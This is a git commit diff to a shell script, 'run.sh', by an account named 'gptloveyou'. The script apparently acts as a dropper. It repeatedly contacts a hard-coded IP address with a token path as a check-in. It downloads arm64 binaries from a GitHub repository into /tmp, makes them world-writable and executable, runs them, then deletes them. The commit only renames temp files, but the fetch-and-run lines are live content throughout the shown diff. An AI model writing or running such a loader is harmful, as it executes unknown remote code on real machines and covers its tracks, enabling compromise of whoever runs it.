a59a7fae7f9ff5e5eee4898fd3307d6ea6fc3e45
gptloveyou <129956509+gptloveyou@users.noreply.github.com>
2023-04-06 10:28:35 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -7,10 +7,10 @@ rm /tmp/arm64_5.bin
 
 curl -s http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug
 
-curl -o /tmp/_arm64_6.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_6.bin
+curl -o /tmp/arm64_6.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_6.bin
 chmod 777 /tmp/run_arm64_6.bin
-/tmp/_arm64_6.bin
-rm /tmp/_arm64_6.bin
+/tmp/arm64_6.bin
+rm /tmp/arm64_6.bin
 
 curl -s http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug
 curl -o /tmp/arm64_7.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_7.bin
